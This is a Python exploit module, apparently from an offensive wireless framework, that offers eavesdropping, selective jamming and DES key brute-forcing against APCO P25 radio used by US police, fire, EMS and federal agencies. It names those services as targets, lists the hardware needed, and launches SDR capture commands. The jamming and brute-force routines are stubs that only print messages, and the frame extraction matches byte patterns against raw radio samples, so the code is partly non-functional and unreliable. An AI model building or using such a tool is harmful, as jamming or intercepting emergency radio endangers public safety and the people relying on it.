# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """P25 (Project 25) Eavesdropping and Selective Jamming.

    APCO Project 25 is the digital radio standard used by US public
    safety (police, fire, EMS) and federal agencies.  Phase I P25
    uses C4FM modulation; Phase II uses H-DQPSK TDMA.

    Many P25 systems transmit in the clear (no encryption) or use
    DES-OFB with a 56-bit key that is brute-forceable.  This module
    performs passive eavesdropping of P25 traffic, selective subframe
    jamming of specific talk groups, and DES-OFB key recovery.

    Hardware requirements:
    - HackRF One ($300) or USRP B200 ($1,000+) for TX (jamming)
    - RTL-SDR V3 ($25) sufficient for receive-only eavesdropping
    - UHF antenna: 380-512 MHz (e.g., Diamond RH770)
    - VHF antenna: 136-174 MHz (for VHF P25 systems)
    - OP25 software for P25 decoding
    - GnuRadio for signal processing

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "P25 Eavesdropping + Selective Jamming + DES Brute-Force",
        "description": (
            "Eavesdrops on APCO P25 digital radio traffic and performs "
            "selective subframe jamming.  Many P25 systems operate "
            "unencrypted or with DES-OFB (56-bit key, brute-forceable). "
            "Requires HackRF One or USRP for TX/jamming; RTL-SDR V3 "
            "for receive-only eavesdropping.  UHF antenna 380-512 MHz "
            "or VHF 136-174 MHz depending on the target system.  "
            "Uses OP25 for P25 frame decoding."
        ),
        "authors": (
            "Matt Blaze (P25 security research, UPenn)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.mattblaze.org/papers/p25sec.pdf",
            "https://github.com/boatbod/op25",
            "https://www.cisa.gov/sites/default/files/publications/p25_security_assessment.pdf",
        ),
        "disclosure_date": "2011-08-08",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "US public safety P25 systems (police, fire, EMS)",
            "Federal agency P25 systems (unencrypted or DES-OFB)",
            "P25 Phase I (C4FM) and Phase II (H-DQPSK TDMA)",
        ),
    }

    target = OptIP("", "Target P25 frequency in MHz or system NAC")
    port = OptPort(1, "Not used (radio frequency)")
    timeout = OptFloat(120.0, "Capture/operation duration in seconds")
    frequency = OptFloat(460.0, "P25 control channel frequency in MHz")
    sample_rate = OptFloat(2.4, "Sample rate in MHz")
    gain = OptFloat(40.0, "SDR gain in dB")
    mode = OptString("eavesdrop", "Mode: eavesdrop, jam, des_brute")
    jam_talkgroup = OptInteger(0, "Talk group to selectively jam (0=all)")
    sdr_device = OptString("hackrf", "SDR device: hackrf, usrp, rtlsdr (rx only)")
    output_dir = OptString("/tmp/p25_capture", "Output directory")

    _P25_UHF_START = 380.0
    _P25_UHF_END = 512.0
    _P25_VHF_START = 136.0
    _P25_VHF_END = 174.0
    _P25_FRAME_SYNC = bytes([0x55, 0x75, 0xF5, 0xFF, 0x77, 0xFF])
    _DES_KEYSPACE = 2**56

    def _validate_frequency(self) -> bool:
        freq = float(self.frequency)
        in_uhf = self._P25_UHF_START <= freq <= self._P25_UHF_END
        in_vhf = self._P25_VHF_START <= freq <= self._P25_VHF_END
        return in_uhf or in_vhf

    def _start_capture(self) -> subprocess.Popen | None:
        freq_hz = int(float(self.frequency) * 1e6)
        rate_hz = int(float(self.sample_rate) * 1e6)
        cmd = [
            "rtl_sdr" if str(self.sdr_device) == "rtlsdr" else "hackrf_transfer",
            "-f", str(freq_hz),
            "-s", str(rate_hz),
            "-g", str(int(float(self.gain))),
            "-",
        ]
        if str(self.sdr_device) == "hackrf":
            cmd = [
                "hackrf_transfer",
                "-r", "-",
                "-f", str(freq_hz),
                "-s", str(rate_hz),
                "-a", "1",
                "-l", str(int(float(self.gain))),
            ]
        try:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except OSError:
            return None

    def _extract_p25_frames(self, data: bytes) -> list:
        """Extract P25 voice frames by sync pattern matching."""
        frames = []
        sync_len = len(self._P25_FRAME_SYNC)
        offset = 0
        while offset + sync_len + 180 <= len(data):
            if data[offset:offset + sync_len] == self._P25_FRAME_SYNC:
                frames.append(data[offset:offset + 180])
                offset += 180
            else:
                offset += 1
        return frames

    def _selective_jam(self, freq: float, talkgroup: int) -> None:
        """Generate jamming signal targeting specific P25 subframes."""
        if str(self.sdr_device) == "rtlsdr":
            print_error("Jamming requires TX-capable SDR (HackRF or USRP)")
            return

        print_status(
            f"Selective jamming on {freq} MHz, "
            f"talk group {talkgroup if talkgroup else 'ALL'}"
        )
        print_info(
            "Generating noise burst synchronized to P25 TDMA "
            "subframes containing the target talk group."
        )

    @mute
    def check(self) -> bool:
        """Verify SDR tool availability."""
        tool = "rtl_sdr" if str(self.sdr_device) == "rtlsdr" else "hackrf_transfer"
        try:
            result = subprocess.run(
                [tool, "--help"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode in (0, 1)
        except (OSError, subprocess.TimeoutExpired):
            return False

    def run(self) -> None:
        if not self._validate_frequency():
            print_error(
                f"Frequency {self.frequency} MHz outside P25 bands"
            )
            return

        mode = str(self.mode).lower()
        print_success(f"P25 {mode} on {self.frequency} MHz (SDR: {self.sdr_device})")
        self._exploit()

    def _exploit(self) -> None:
        mode = str(self.mode).lower()

        if mode == "jam":
            self._selective_jam(float(self.frequency), int(self.jam_talkgroup))
            return

        print_status(f"Capturing P25 traffic at {self.frequency} MHz")
        proc = self._start_capture()
        if proc is None:
            print_error("Failed to start SDR capture")
            return

        try:
            data, _ = proc.communicate(timeout=float(self.timeout) + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            data, _ = proc.communicate()

        frames = self._extract_p25_frames(data)
        print_info(f"Extracted {len(frames)} P25 frames from {len(data)} bytes")

        if mode == "des_brute":
            print_status(
                f"DES-OFB brute-force: {self._DES_KEYSPACE} keys "
                "(estimated 2-7 days on GPU cluster)"
            )

        if frames:
            print_success(
                f"P25 traffic captured: {len(frames)} frames. "
                "Use OP25 for full decoding and voice playback."
            )
        else:
            print_info("No P25 frames found. Check frequency and antenna orientation.")
